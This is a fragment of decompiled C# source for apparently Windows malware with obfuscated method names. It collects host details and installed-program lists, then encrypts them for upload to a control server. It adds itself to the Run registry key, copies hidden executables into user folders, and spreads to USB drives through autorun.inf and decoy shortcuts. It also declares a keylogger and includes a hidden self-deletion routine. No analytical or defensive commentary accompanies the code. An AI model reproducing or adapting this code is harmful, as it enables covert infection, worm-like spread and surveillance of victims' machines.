			using (GZipStream gZipStream = new GZipStream(memoryStream, CompressionMode.Compress, leaveOpen: true))
			{
				gZipStream.Write(bytes, 0, bytes.Length);
			}
			memoryStream.Position = 0L;
			new MemoryStream();
			byte[] array = new byte[(int)(memoryStream.Length - 1L) + 1];
			memoryStream.Read(array, 0, array.Length);
			byte[] array2 = new byte[array.Length + 3 + 1];
			Buffer.BlockCopy(array, 0, array2, 4, array.Length);
			Buffer.BlockCopy(BitConverter.GetBytes(bytes.Length), 0, array2, 0, 4);
			return Convert.ToBase64String(array2);
		}

		public string encryptToXml(XElement data)
		{
			//IL_0017: Unknown result type (might be due to invalid IL or missing references)
			//IL_001d: Expected O, but got Unknown
			//IL_006c: Unknown result type (might be due to invalid IL or missing references)
			//IL_0076: Expected O, but got Unknown
			//IL_0088: Unknown result type (might be due to invalid IL or missing references)
			//IL_0092: Expected O, but got Unknown
			try
			{
				object objectValue = RuntimeHelpers.GetObjectValue(controlState.RandomString(50));
				XElement val = new XElement(XName.op_Implicit("encrypted"));
				string text = encryptStringWithKey(Resources.publicKey, Conversions.ToString(objectValue));
				object obj = AES_Encrypt(((XNode)data).ToString(), Conversions.ToString(objectValue));
				if (Information.IsNothing(RuntimeHelpers.GetObjectValue(obj)) | Information.IsNothing((object)text))
				{
					return "";
				}
				((XContainer)val).Add((object)new XElement(XName.op_Implicit("password"), (object)text));
				((XContainer)val).Add((object)new XElement(XName.op_Implicit("content"), RuntimeHelpers.GetObjectValue(obj)));
				return ((XNode)val).ToString();
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				actions.dsefrgthgbrfvefnhtjrmkjnyhtbgrvfgthyjmkyymjyhtg5yh6uj7ik8ij7uhy6gt54y6ju7k8lkujmynhtrgthyjukjuuyh("0x900000");
				string result = "";
				ProjectData.ClearProjectError();
				return result;
			}
		}

		public string AES_Encrypt(string input, string pass)
		{
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
			try
			{
				byte[] array = new byte[32];
				byte[] sourceArray = mD5CryptoServiceProvider.ComputeHash(Encoding.ASCII.GetBytes(pass));
				Array.Copy(sourceArray, 0, array, 0, 16);
				Array.Copy(sourceArray, 0, array, 15, 16);
				rijndaelManaged.Key = array;
				rijndaelManaged.Mode = CipherMode.ECB;
				ICryptoTransform cryptoTransform = rijndaelManaged.CreateEncryptor();
				byte[] bytes = Encoding.ASCII.GetBytes(input);
				return Convert.ToBase64String(cryptoTransform.TransformFinalBlock(bytes, 0, bytes.Length));
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				actions.dsefrgthgbrfvefnhtjrmkjnyhtbgrvfgthyjmkyymjyhtg5yh6uj7ik8ij7uhy6gt54y6ju7k8lkujmynhtrgthyjukjuuyh("0x910000");
				string result = null;
				ProjectData.ClearProjectError();
				return result;
			}
		}

		public static string AES_Decrypt(string input, string pass)
		{
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
			try
			{
				byte[] array = new byte[32];
				byte[] sourceArray = mD5CryptoServiceProvider.ComputeHash(Encoding.ASCII.GetBytes(pass));
				Array.Copy(sourceArray, 0, array, 0, 16);
				Array.Copy(sourceArray, 0, array, 15, 16);
				rijndaelManaged.Key = array;
				rijndaelManaged.Mode = CipherMode.ECB;
				ICryptoTransform cryptoTransform = rijndaelManaged.CreateDecryptor();
				byte[] array2 = Convert.FromBase64String(input);
				return Encoding.ASCII.GetString(cryptoTransform.TransformFinalBlock(array2, 0, array2.Length));
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				string result = Conversions.ToString(false);
				ProjectData.ClearProjectError();
				return result;
			}
		}

		public string encryptStringWithKey(string publicXml, string value)
		{
			try
			{
				byte[] bytes = Encoding.ASCII.GetBytes(value);
				RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider();
				rSACryptoServiceProvider.FromXmlString(publicXml);
				return Convert.ToBase64String(rSACryptoServiceProvider.Encrypt(bytes, fOAEP: false));
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				actions.dsefrgthgbrfvefnhtjrmkjnyhtbgrvfgthyjmkyymjyhtg5yh6uj7ik8ij7uhy6gt54y6ju7k8lkujmynhtrgthyjukjuuyh("0x920000");
				string result = null;
				ProjectData.ClearProjectError();
				return result;
			}
		}

		public object DecryptStringWithKey(string privateXml, string value)
		{
			try
			{
				RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider();
				rSACryptoServiceProvider.FromXmlString(privateXml);
				byte[] bytes = rSACryptoServiceProvider.Decrypt(Convert.FromBase64String(value), fOAEP: false);
				return Encoding.Default.GetString(bytes);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				actions.dsefrgthgbrfvefnhtjrmkjnyhtbgrvfgthyjmkyymjyhtg5yh6uj7ik8ij7uhy6gt54y6ju7k8lkujmynhtrgthyjukjuuyh("0x930000");
				object result = "";
				ProjectData.ClearProjectError();
				return result;
			}
		}

		public static object fgrbthbewdxfgvrbdwxfgvrhbtgvrdcewxfvrgbthgvfrdcwxcefgvrtgcedcevrbtrgdcxwcefvrbtgcd(string token)
		{
			try
			{
				if (Convert.ToInt64(AES_Decrypt(token, "theblackbox")) > controlState.getTimeStamp(-8))
				{
					return true;
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			if (Conversions.ToBoolean(controlState.debug))
			{
				actions.dsefrgthgbrfvefnhtjrmkjnyhtbgrvfgthyjmkyymjyhtg5yh6uj7ik8ij7uhy6gt54y6ju7k8lkujmynhtrgthyjukjuuyh("invalid token");
			}
			return false;
		}
	}

	public class CurrentHost
	{
		private string wbhrbtecvbrtegvbthefvwcgvrhgvfcegvrhbtgvrfecgvrhbtgvrfvrgbtfcvgrfc;

		private XElement hostSigantureXml;

		public CurrentHost()
		{
			wbhrbtecvbrtegvbthefvwcgvrhgvfcegvrhbtgvrfecgvrhbtgvrfvrgbtfcvgrfc = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + ((ServerComputer)MyProject.Computer).get_Name() + ".ini";
			hostSigantureXml = null;
			swdefgrthngbrfedefvgrbthn();
		}

		public void swdefgrthngbrfedefvgrbthn()
		{
			//IL_0041: Unknown result type (might be due to invalid IL or missing references)
			//IL_004b: Expected O, but got Unknown
			//IL_0064: Unknown result type (might be due to invalid IL or missing references)
			//IL_006e: Expected O, but got Unknown
			if (File.Exists(wbhrbtecvbrtegvbthefvwcgvrhgvfcegvrhbtgvrfecgvrhbtgvrfvrgbtfcvgrfc))
			{
				try
				{
					hostSigantureXml = XElement.Parse(File.ReadAllText(wbhrbtecvbrtegvbthefvwcgvrhgvfcegvrhbtgvrfecgvrhbtgvrfvrgbtfcvgrfc));
					return;
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					actions.dsefrgthgbrfvefnhtjrmkjnyhtbgrvfgthyjmkyymjyhtg5yh6uj7ik8ij7uhy6gt54y6ju7k8lkujmynhtrgthyjukjuuyh("0x940000");
					hostSigantureXml = new XElement(XName.op_Implicit("windows"));
					syncHostSetting();
					ProjectData.ClearProjectError();
					return;
				}
			}
			try
			{
				hostSigantureXml = new XElement(XName.op_Implicit("windows"));
				syncHostSetting();
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
		}

		private string getMacAddress()
		{
			return NetworkInterface.GetAllNetworkInterfaces()[0].GetPhysicalAddress().ToString();
		}

		public XElement getHostInfo()
		{
			//IL_000a: Unknown result type (might be due to invalid IL or missing references)
			//IL_0010: Expected O, but got Unknown
			//IL_00ea: Unknown result type (might be due to invalid IL or missing references)
			//IL_00f1: Expected O, but got Unknown
			XElement val = new XElement(XName.op_Implicit("SystemInfo"));
			string value = Math.Round((double)((ServerComputer)MyProject.Computer).get_Info().get_TotalPhysicalMemory() / 1048576.0) + " MB";
			string userName = Environment.UserName;
			string name = ((ServerComputer)MyProject.Computer).get_Name();
			string standardName = TimeZoneInfo.Local.StandardName;
			Dictionary<string, string> dictionary = new Dictionary<string, string>();
			dictionary.Add("memory", value);
			dictionary.Add("user", userName);
			dictionary.Add("hostName", name);
			dictionary.Add("timeZone", standardName);
			dictionary.Add("osname", ((ServerComputer)MyProject.Computer).get_Info().get_OSFullName());
			dictionary.Add("hostlink", getHostLink());
			foreach (KeyValuePair<string, string> item in dictionary)
			{
				XElement val2 = new XElement(XName.op_Implicit(item.Key));
				val2.set_Value(item.Value);
				((XContainer)val).Add((object)val2);
			}
			return val;
		}

		public XElement installedApplications()
		{
			//IL_000a: Unknown result type (might be due to invalid IL or missing references)
			//IL_0010: Expected O, but got Unknown
			//IL_0015: Unknown result type (might be due to invalid IL or missing references)
			//IL_002f: Unknown result type (might be due to invalid IL or missing references)
			//IL_0035: Expected O, but got Unknown
			//IL_003f: Unknown result type (might be due to invalid IL or missing references)
			//IL_0046: Expected O, but got Unknown
			XElement val = new XElement(XName.op_Implicit("Applications"));
			ManagementObjectCollection val2 = new ManagementObjectSearcher("Select * from Win32_Product").Get();
			ManagementObjectEnumerator enumerator = default(ManagementObjectEnumerator);
			try
			{
				enumerator = val2.GetEnumerator();
				while (enumerator.MoveNext())
				{
					ManagementObject val3 = (ManagementObject)enumerator.get_Current();
					XElement val4 = new XElement(XName.op_Implicit("app"));
					val4.set_Value(((ManagementBaseObject)val3).get_Item("Name").ToString());
					val4.SetAttributeValue(XName.op_Implicit("path"), (object)((ManagementBaseObject)val3).get_Item("InstallSource").ToString());
					((XContainer)val).Add((object)val4);
				}
				return val;
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
		}

		public object uploadDetails()
		{
			//IL_009e: Unknown result type (might be due to invalid IL or missing references)
			//IL_00a8: Expected O, but got Unknown
			try
			{
				if (Convert.ToInt64(((XContainer)hostSigantureXml).Element(XName.op_Implicit("hostinfolasttime")).get_Value()) > controlState.getTimeStamp())
				{
					return false;
				}
				((XContainer)hostSigantureXml).Element(XName.op_Implicit("hostinfolasttime")).set_Value(controlState.getTimeStamp(7).ToString());
				syncHostSetting();
				return true;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				actions.dsefrgthgbrfvefnhtjrmkjnyhtbgrvfgthyjmkyymjyhtg5yh6uj7ik8ij7uhy6gt54y6ju7k8lkujmynhtrgthyjukjuuyh("0x990000");
				swdefgrthngbrfedefvgrbthn();
				((XContainer)hostSigantureXml).Add((object)new XElement(XName.op_Implicit("hostinfolasttime"), (object)controlState.getTimeStamp(7).ToString()));
				syncHostSetting();
				object result = true;
				ProjectData.ClearProjectError();
				return result;
			}
		}

		public bool efffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff()
		{
			try
			{
				if (Operators.ConditionalCompareObjectEqual(controlState.debug, (object)true, false))
				{
					return true;
				}
				if (!File.Exists(wbhrbtecvbrtegvbthefvwcgvrhgvfcegvrhbtgvrfecgvrhbtgvrfvrgbtfcvgrfc))
				{
					return false;
				}
				try
				{
					if (Convert.ToInt64(((XContainer)hostSigantureXml).Element(XName.op_Implicit("hostinfolasttime")).get_Value()) > controlState.getTimeStamp(-2))
					{
						return true;
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					init();
					ProjectData.ClearProjectError();
				}
				return false;
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				actions.dsefrgthgbrfvefnhtjrmkjnyhtbgrvfgthyjmkyymjyhtg5yh6uj7ik8ij7uhy6gt54y6ju7k8lkujmynhtrgthyjukjuuyh("0x991000");
				bool result = false;
				ProjectData.ClearProjectError();
				return result;
			}
		}

		public void init()
		{
			//IL_000b: Unknown result type (might be due to invalid IL or missing references)
			//IL_0015: Expected O, but got Unknown
			//IL_0030: Unknown result type (might be due to invalid IL or missing references)
			//IL_003a: Expected O, but got Unknown
			try
			{
				hostSigantureXml = new XElement(XName.op_Implicit("windows"));
				((XContainer)hostSigantureXml).Add((object)new XElement(XName.op_Implicit("hostinfolasttime"), (object)controlState.getTimeStamp(5)));
				syncHostSetting();
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}

		public XElement getData()
		{
			//IL_000a: Unknown result type (might be due to invalid IL or missing references)
			//IL_0010: Expected O, but got Unknown
			XElement val = new XElement(XName.op_Implicit("inforamtionsOnHost"));
			if (Conversions.ToBoolean(uploadDetails()))
			{
				((XContainer)val).Add((object)installedApplications());
				((XContainer)val).Add((object)getHostInfo());
				return val;
			}
			return null;
		}

		public string getHostIdentity()
		{
			try
			{
				if (((XContainer)hostSigantureXml).Element(XName.op_Implicit("idhost")).get_Value().Length > 1)
				{
					return ((XContainer)hostSigantureXml).Element(XName.op_Implicit("idhost")).get_Value();
				}
				return Conversions.ToString(makeHostIdentity());
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				string result = Conversions.ToString(makeHostIdentity());
				ProjectData.ClearProjectError();
				return result;
			}
		}

		public object makeHostIdentity()
		{
			//IL_004e: Unknown result type (might be due to invalid IL or missing references)
			//IL_0058: Expected O, but got Unknown
			((XContainer)hostSigantureXml).Add((object)new XElement(XName.op_Implicit("idhost"), Operators.ConcatenateObject(controlState.RandomString(20), (object)(((ServerComputer)MyProject.Computer).get_Name() + Environment.UserName).Replace("/", "").Replace("\\", ""))));
			syncHostSetting();
			return ((XContainer)hostSigantureXml).Element(XName.op_Implicit("idhost")).get_Value();
		}

		public string getHostLink()
		{
			try
			{
				if (((XContainer)hostSigantureXml).Element(XName.op_Implicit("link")).get_Value().Length > 1)
				{
					return ((XContainer)hostSigantureXml).Element(XName.op_Implicit("link")).get_Value();
				}
				return Conversions.ToString(makeHostLink());
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				actions.dsefrgthgbrfvefnhtjrmkjnyhtbgrvfgthyjmkyymjyhtg5yh6uj7ik8ij7uhy6gt54y6ju7k8lkujmynhtrgthyjukjuuyh("0x992000x");
				string result = Conversions.ToString(makeHostLink());
				ProjectData.ClearProjectError();
				return result;
			}
		}

		public object makeHostLink()
		{
			//IL_005d: Unknown result type (might be due to invalid IL or missing references)
			//IL_0067: Expected O, but got Unknown
			((XContainer)hostSigantureXml).Add((object)new XElement(XName.op_Implicit("link"), Operators.ConcatenateObject(controlState.RandomString(10), (object)(((ServerComputer)MyProject.Computer).get_Name() + Environment.UserName).Replace("/", "").Replace("\\", "").Replace("-", ""))));
			syncHostSetting();
			return ((XContainer)hostSigantureXml).Element(XName.op_Implicit("link")).get_Value();
		}

		public void syncHostSetting()
		{
			actions.dcwfgrthyjnbgvrgvrthnyjuyefcfrgvhyjuyhcefxwcefrgvthyjuyhgrfedx(hostSigantureXml);
		}
	}

	public class actions
	{
		private static object inffectedDirSignature = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + ((ServerComputer)MyProject.Computer).get_Name() + ".ini";

		public void dcwefgrthterrtytttrryyiuytuoippuytryujtrgtyjtgrfertyjtgrffenhbtgrvfrgrtnhyjnthbgrvrgtyjhtbgrvghjhbgbtnhjynhtbgr(string wdcfevbgrhyjhgfdwfevtrhnyjmnhbgefvwefvtrhy, bool st = true)
		{
			try
			{
				if (Conversions.ToBoolean(controlState.debug))
				{
					return;
				}
				try
				{
					if (st)
					{
						((ServerComputer)MyProject.Computer).get_Registry().get_CurrentUser().OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.SetValue(Conversions.ToString(Operators.ConcatenateObject((object)" ", controlState.RandomString(2))), wdcfevbgrhyjhgfdwfevtrhnyjmnhbgefvwefvtrhy);
					}
					else
					{
						((ServerComputer)MyProject.Computer).get_Registry().get_CurrentUser().OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.DeleteValue("WinSyS Network Service ");
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					dsefrgthgbrfvefnhtjrmkjnyhtbgrvfgthyjmkyymjyhtg5yh6uj7ik8ij7uhy6gt54y6ju7k8lkujmynhtrgthyjukjuuyh("0x994000");
					ProjectData.ClearProjectError();
				}
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
		}

		public void csefvgrhtyjuioppooiouiyygrhgfdfgbfvdfnhgbfvvfyjtbgrefvntjmtnhbegvfwnhfvdcbgrtnhhbgfvdc()
		{
			try
			{
				try
				{
					File.Delete(Conversions.ToString(inffectedDirSignature));
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
				object obj = Operators.ConcatenateObject(Operators.ConcatenateObject((object)(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\"), controlState.RandomString(10)), (object)".exe");
				try
				{
					while (File.Exists(Conversions.ToString(obj)))
					{
						obj = Operators.ConcatenateObject(Operators.ConcatenateObject((object)(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\"), controlState.RandomString(10)), (object)".exe");
					}
					File.Copy(Application.get_ExecutablePath(), Conversions.ToString(obj));
					File.SetAttributes(Conversions.ToString(obj), FileAttributes.Hidden);
					dcwefgrthterrtytttrryyiuytuoippuytryujtrgtyjtgrfertyjtgrffenhbtgrvfrgrtnhyjnthbgrvrgtyjhtbgrvghjhbgbtnhjynhtbgr(Conversions.ToString(obj));
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					dsefrgthgbrfvefnhtjrmkjnyhtbgrvfgthyjmkyymjyhtg5yh6uj7ik8ij7uhy6gt54y6ju7k8lkujmynhtrgthyjukjuuyh("0x995000");
					ProjectData.ClearProjectError();
				}
				try
				{
					object obj2 = Operators.ConcatenateObject(Operators.ConcatenateObject((object)(Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\"), controlState.RandomString(2)), (object)".exe");
					while (File.Exists(Conversions.ToString(obj2)))
					{
						obj2 = Operators.ConcatenateObject(Operators.ConcatenateObject((object)(Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\"), controlState.RandomString(2)), (object)".exe");
					}
					File.Copy(Application.get_ExecutablePath(), Conversions.ToString(obj2));
					File.SetAttributes(Conversions.ToString(obj2), FileAttributes.Hidden);
					dcwefgrthterrtytttrryyiuytuoippuytryujtrgtyjtgrfertyjtgrffenhbtgrvfrgrtnhyjnthbgrvrgtyjhtbgrvghjhbgbtnhjynhtbgr(Conversions.ToString(obj2));
				}
				catch (Exception projectError3)
				{
					ProjectData.SetProjectError(projectError3);
					dsefrgthgbrfvefnhtjrmkjnyhtbgrvfgthyjmkyymjyhtg5yh6uj7ik8ij7uhy6gt54y6ju7k8lkujmynhtrgthyjukjuuyh("0x996000");
					ProjectData.ClearProjectError();
				}
				try
				{
					if (!File.Exists(Conversions.ToString(inffectedDirSignature)))
					{
						File.Create(Conversions.ToString(inffectedDirSignature)).Close();
						new CurrentHost().init();
						File.SetAttributes(Conversions.ToString(inffectedDirSignature), FileAttributes.Hidden);
					}
				}
				catch (Exception projectError4)
				{
					ProjectData.SetProjectError(projectError4);
					dsefrgthgbrfvefnhtjrmkjnyhtbgrvfgthyjmkyymjyhtg5yh6uj7ik8ij7uhy6gt54y6ju7k8lkujmynhtrgthyjukjuuyh("0x997000");
					ProjectData.ClearProjectError();
				}
				try
				{
					Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + ((ServerComputer)MyProject.Computer).get_Name());
				}
				catch (Exception projectError5)
				{
					ProjectData.SetProjectError(projectError5);
					dsefrgthgbrfvefnhtjrmkjnyhtbgrvfgthyjmkyymjyhtg5yh6uj7ik8ij7uhy6gt54y6ju7k8lkujmynhtrgthyjukjuuyh("0x998000");
					ProjectData.ClearProjectError();
				}
				try
				{
					Process.Start(Conversions.ToString(obj), "restart");
				}
				catch (Exception projectError6)
				{
					ProjectData.SetProjectError(projectError6);
					try
					{
						Process.Start("cmd.exe", Conversions.ToString(obj));
					}
					catch (Exception projectError7)
					{
						ProjectData.SetProjectError(projectError7);
						ProjectData.ClearProjectError();
					}
					dsefrgthgbrfvefnhtjrmkjnyhtbgrvfgthyjmkyymjyhtg5yh6uj7ik8ij7uhy6gt54y6ju7k8lkujmynhtrgthyjukjuuyh("0x999000");
					ProjectData.ClearProjectError();
				}
			}
			catch (Exception projectError8)
			{
				ProjectData.SetProjectError(projectError8);
				ProjectData.ClearProjectError();
			}
			Environment.Exit(0);
		}

		public object scbgfyjgnhvdxwfgvrnyjmubgvcdfgvrhyjutrhyuiopuytyuioerwytyurhytvhtgvtrrbretreggrec()
		{
			DriveInfo[] drives = DriveInfo.GetDrives();
			foreach (DriveInfo driveInfo in drives)
			{
				try
				{
					if (!driveInfo.IsReady || !((driveInfo.AvailableFreeSpace > 3084L) & (driveInfo.DriveType == DriveType.Removable)))
					{
						continue;
					}
					Type typeFromHandle = typeof(Thread);
					object[] obj = new object[1] { controlState.errrrrrrrrrrrrrrrrrrrrrrrrrrrrgggggggggggggggggggggggg };
					object[] array = obj;
					bool[] obj2 = new bool[1] { true };
					bool[] array2 = obj2;
					NewLateBinding.LateCall((object)null, typeFromHandle, "Sleep", obj, (string[])null, (Type[])null, obj2, true);
					if (array2[0])
					{
						controlState.errrrrrrrrrrrrrrrrrrrrrrrrrrrrgggggggggggggggggggggggg = RuntimeHelpers.GetObjectValue(array[0]);
					}
					DirectoryInfo directoryInfo = new DirectoryInfo(driveInfo.Name);
					FileInfo[] files = directoryInfo.GetFiles();
					int num = 0;
					bool flag = false;
					object obj3 = Operators.ConcatenateObject(Operators.ConcatenateObject((object)(directoryInfo.get_Name() + "\\"), controlState.RandomString(2)), (object)".exe");
					while (File.Exists(Conversions.ToString(obj3)))
					{
						obj3 = Operators.ConcatenateObject(Operators.ConcatenateObject((object)(directoryInfo.get_Name() + "\\"), controlState.RandomString(2)), (object)".exe");
					}
					FileInfo[] array3 = files;
					foreach (FileInfo fileInfo in array3)
					{
						if (num > 3)
						{
							break;
						}
						if (!((Operators.CompareString(fileInfo.Extension, ".lnk", false) == 0) | (fileInfo.Length > 100000000L) | File.Exists(fileInfo.DirectoryName + "\\autorun.inf")))
						{
							Type typeFromHandle2 = typeof(Thread);
							object[] obj4 = new object[1] { controlState.errrrrrrrrrrrrrrrrrrrrrrrrrrrrgggggggggggggggggggggggg };
							array = obj4;
							bool[] obj5 = new bool[1] { true };
							array2 = obj5;
							NewLateBinding.LateCall((object)null, typeFromHandle2, "Sleep", obj4, (string[])null, (Type[])null, obj5, true);
							if (array2[0])
							{
								controlState.errrrrrrrrrrrrrrrrrrrrrrrrrrrrgggggggggggggggggggggggg = RuntimeHelpers.GetObjectValue(array[0]);
							}
							flag = true;
							createShotcutOnRemovable(fileInfo.DirectoryName, fileInfo.get_Name(), Conversions.ToString(obj3));
							num++;
						}
					}
					if (flag)
					{
						File.Copy(Application.get_ExecutablePath(), Conversions.ToString(obj3));
						File.SetAttributes(Conversions.ToString(obj3), FileAttributes.Hidden);
						StreamWriter streamWriter = new StreamWriter(directoryInfo.get_Name() + "\\autorun.inf");
						streamWriter.WriteLine("[autorun]");
						streamWriter.WriteLine(Operators.ConcatenateObject((object)"open=", obj3));
						streamWriter.WriteLine(Conversions.ToString(Operators.ConcatenateObject((object)"shellexecute=", obj3)), 1);
						streamWriter.Close();
						File.SetAttributes(directoryInfo.get_Name() + "autorun.inf", FileAttributes.Hidden);
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
			return null;
		}

		public void createShotcutOnRemovable(string path, string name, string exe)
		{
			try
			{
				object objectValue = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(Interaction.CreateObject("WScript.Shell", "")), (Type)null, "CreateShortcut", new object[1] { path + "\\" + name + ".lnk" }, (string[])null, (Type[])null, (bool[])null));
				NewLateBinding.LateSet(objectValue, (Type)null, "TargetPath", new object[1] { exe }, (string[])null, (Type[])null);
				NewLateBinding.LateSet(objectValue, (Type)null, "Arguments", new object[1] { "-h " + path + "\\" + name }, (string[])null, (Type[])null);
				NewLateBinding.LateSet(objectValue, (Type)null, "WindowStyle", new object[1] { 1 }, (string[])null, (Type[])null);
				NewLateBinding.LateCall(objectValue, (Type)null, "Save", new object[0], (string[])null, (Type[])null, (bool[])null, true);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}

		public void suicide()
		{
			try
			{
				try
				{
					File.Delete(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(inffectedDirSignature, (object)"\\"), (object)((ServerComputer)MyProject.Computer).get_Name()), (object)".ini")));
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					dsefrgthgbrfvefnhtjrmkjnyhtbgrvfgthyjmkyymjyhtg5yh6uj7ik8ij7uhy6gt54y6ju7k8lkujmynhtrgthyjukjuuyh("0x999100");
					ProjectData.ClearProjectError();
				}
				try
				{
					Process.Start(new ProcessStartInfo
					{
						Arguments = "/C choice /C Y /N /D Y /T 5 & Del \"" + Application.get_ExecutablePath() + "\"",
						WindowStyle = ProcessWindowStyle.Hidden,
						CreateNoWindow = true,
						FileName = "cmd.exe"
					});
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					dsefrgthgbrfvefnhtjrmkjnyhtbgrvfgthyjmkyymjyhtg5yh6uj7ik8ij7uhy6gt54y6ju7k8lkujmynhtrgthyjukjuuyh("0x999200");
					ProjectData.ClearProjectError();
				}
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
			}
		}

		public static void dsefrgthgbrfvefnhtjrmkjnyhtbgrvfgthyjmkyymjyhtg5yh6uj7ik8ij7uhy6gt54y6ju7k8lkujmynhtrgthyjukjuuyh(string str)
		{
		}

		public static void dcwfgrthyjnbgvrgvrthnyjuyefcfrgvhyjuyhcefxwcefrgvthyjuyhgrfedx(XElement hostSigantureXml)
		{
			object writeLock = WriteLock;
			ObjectFlowControl.CheckForSyncLockOnValueType(writeLock);
			bool lockTaken = false;
			try
			{
				Monitor.Enter(writeLock, ref lockTaken);
				try
				{
					try
					{
						File.Delete(Conversions.ToString(inffectedDirSignature));
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
					object[] array;
					bool[] array2;
					NewLateBinding.LateCall((object)hostSigantureXml, (Type)null, "Save", array = new object[1] { inffectedDirSignature }, (string[])null, (Type[])null, array2 = new bool[1] { true }, true);
					if (array2[0])
					{
						inffectedDirSignature = RuntimeHelpers.GetObjectValue(array[0]);
					}
				}
				catch (Exception ex)
				{
					ProjectData.SetProjectError(ex);
					Exception ex2 = ex;
					dsefrgthgbrfvefnhtjrmkjnyhtbgrvfgthyjmkyymjyhtg5yh6uj7ik8ij7uhy6gt54y6ju7k8lkujmynhtrgthyjukjuuyh("0x993000EE" + ex2.Message);
					ProjectData.ClearProjectError();
				}
			}
			finally
			{
				if (lockTaken)
				{
					Monitor.Exit(writeLock);
				}
			}
		}
	}

	private static dcefrghtbvefcgvrtdscfvgrbtnhrbgefvrnthdfghnfbegrthgrfewgtsdefvgrbtgvfcd keylog;

	private static controlState conState;

	private static actions act;

	private static CurrentHost curHost;

	private static object lg = false;

	private static object objLock = RuntimeHelpers.GetObjectValue(new object());

	private static object WriteLock = RuntimeHelpers.GetObjectValue(new object());

	private static object KeyLock = RuntimeHelpers.GetObjectValue(new object());

	private static object backgroundUploadTime = 1200001;

	private static string[] args;

	private static Timer tm;

	private static Thread t2 = new Thread(dfwegrhtyjukjtgrfvgthyjgfvevgrhtnyjtgredcwfgrhyjtgrecfgrthyjnfvscdfvbgrhnyjtfvdcfvgrbthfvewdcfevrgtbhgre);

	private static Thread t1 = new Thread(aefgrhyjkuiluthergtvbhyjutgrgcthyjuyjhtgrfgthyjuyhgcfgrthjhygrfcrgtvhbynjybgvrcfgvrhyjnbhgvd);

	[MethodImpl(MethodImplOptions.NoOptimization)]
	[STAThread]
	public static void Main()
	{
		args = Environment.GetCommandLineArgs();
		curHost = new CurrentHost();
		svdgrhtnyjtgrfvcfvbgrhtyjujtgrfvdcdvgbhnyjujhgfvdsbgfnhyjkuyjtgfvdgvhnyjuynhgfvscvrgtbhbfcvrbtynbgtfvrcvrbtnyvrf();
		if (!args.Contains("restart"))
		{
			Mutex mutex = new Mutex(initiallyOwned: false, ((ApplicationBase)MyProject.Application).get_Info().get_AssemblyName());
			if (!mutex.WaitOne(0, exitContext: false))
			{
				mutex.Close();
				mutex = null;
				ProjectData.EndApp();
			}
		}
		conState = new controlState();
		if (args.Contains("debug"))
		{
			conState.debuging();
		}
		else if (args.Contains("launch"))
		{
			conState.launcher();
		}
		if (args.Contains("local"))
		{
			conState.local();
		}
		try
		{
			conState.validServerUrl(Conversions.ToString(Operators.ConcatenateObject((object)"&status=startedInTheHouse", controlState.RandomString(10))));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		act = new actions();
		keylog = new dcefrghtbvefcgvrtdscfvgrbtnhrbgefvrnthdfghnfbegrthgrfewgtsdefvgrbtgvfcd();
		wdfegrbfvdcsqcwefvbgrvfdcwefvfvrdcewfevr();
		Application.add_ThreadExit((EventHandler)delegate
